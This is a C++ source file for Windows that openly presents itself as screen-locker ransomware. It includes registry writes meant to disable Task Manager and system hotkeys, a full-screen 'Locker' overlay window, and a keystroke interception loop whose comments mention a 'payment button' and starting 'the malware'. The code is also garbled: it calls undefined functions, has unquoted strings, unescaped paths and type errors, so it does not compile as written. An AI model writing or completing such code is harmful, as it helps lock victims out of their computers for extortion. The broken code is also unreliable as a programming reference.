#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <shlobj.h>
#include <shellapi.h>

using namespace std;

const char* LockerFilename = "Locker.txt";

// Environment Check ----------------------------------------
int CheckScreenResolution() {
    int width, height;
    GetScreenResolution(width, height);
    return width == 1920 && height == 1080 ? 1 : 0; // 1920x1080 resolution. Adjust as needed.
}

int CheckOSVersion() {
    OSVERSIONINFOEX info;
    ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
    info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetOsVersion(&info, 0);
    return info.dwMajorVersion == 6 && info.dwMinorVersion >= 1 ? 1 : 0; // Windows 7 or higher. Adjust as needed.
}
// UI Suppression --------------------------------------------
int DisableTaskManager() {
    HKEY hkey, key;
    DWORD data = 1;
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\Microsoft\Windows\CurrentVersion\Group Policies"), NULL, &hkey) == ERROR_SUCCESS) {
        // Disable Task Manager via Group Policy
        RegSetValueEx(hkey, TEXT("/TaskManager"), 0, REG_DWORD, &data);
    } else if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\Microsoft\Windows\CurrentVersion\Group Policies"), NULL, &hkey) == ERROR_SUCCESS) {
        // Disable Task Manager via Group Policy on a domain computer
        RegSetValueEx(hkey, TEXT("/TaskManager"), 0, REG_DWORD, &data);
    }
    
    return 1;
}
int DisableSystemHotkeys() {
    HKEY hkey, key;
    DWORD data = 2; // 1 = disable Alt+F4 and Ctrl+Alt+Del hotkeys. 0 = disable only Alt+F4. Adjust as needed.
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\Microsoft\Windows\CurrentVersion\Group Policies"), NULL, &hkey) == ERROR_SUCCESS) {
        // Disable hotkeys via Group Policy
        RegSetValueEx(hkey, TEXT("/ControlHotkey"), 0, REG_DWORD, &data);
    } else if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\Microsoft\Windows\CurrentVersion\Group Policies"), NULL, &hkey) == ERROR_SUCCESS) {
        // Disable hotkeys via Group Policy on a domain computer
        RegSetValueEx(hkey, TEXT("/ControlHotkey"), 0, REG_DWORD, &data);
    }
    
    return 1;
}
// Overlay Creation ------------------------------------------
int CreateOverlayWindow() {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    HWND hWnd = FindWindow(TEXT("Locker"), NULL);

    if (!hWnd) {
        // Create new window
        HINSTANCE hInst = LoadLibrary(TEXT("lockscreen.dll"));
        hWnd = CreateWindowEx(WS_EX_APPWINDOW, TEXT("Locker"), NULL, 0, CW_USEDEFAULT, CW_USEDEFAULT, 1920, 1080, NULL, NULL, hInst, NULL);
    }
    
    if (!hWnd) {
        cout << CreateWindow failed. << endl;
        return 0;
    }

    ShowWindow(hWnd, SW_SHOWNOACTIVATE); // Show window without making it active
    SetForegroundWindow(hWnd); // Make window the active one (so it stays on top)
    
    return hWnd;
}
// Input Interception ----------------------------------------
int InterceptInput() {
    HWND hWnd = CreateOverlayWindow();

    while (true) {
        MSG msg;
        PeekMessage(&msg, NULL, 0, 0);
        
        if (msg.message == WM_KEYDOWN || msg.message == WM_SYSKEYDOWN) {
            int key = static_cast<int>(msg.wParam);

            // Process input here
            // For example:
            // if (key == VK_F12) { // F12 is the payment button. Adjust as needed.
            //     SendMessage(hWnd, WM_COMMAND, MAKEINTRESOURCE(IDCANCEL), NULL);
            // }
        } else if (msg.message == WM_DESTROY) {
            // Window was closed or the user pressed Alt+F4 or Ctrl+Alt+Del. Exit malware here.
            break;
        }
    }
    
    return hWnd;
}
// Main Program ----------------------------------------------
int main() {
    if (!CheckScreenResolution()) {
        cout << Screen resolution not supported: << width << x << height << endl;
        return 0;
    }
    
    if (!CheckOSVersion()) {
        cout << OS version not supported: << info.dwMajorVersion <<.<< info.dwMinorVersion << endl;
        return 0;
    }
    
    InterceptInput(); // Start the malware here

    return 0;
}
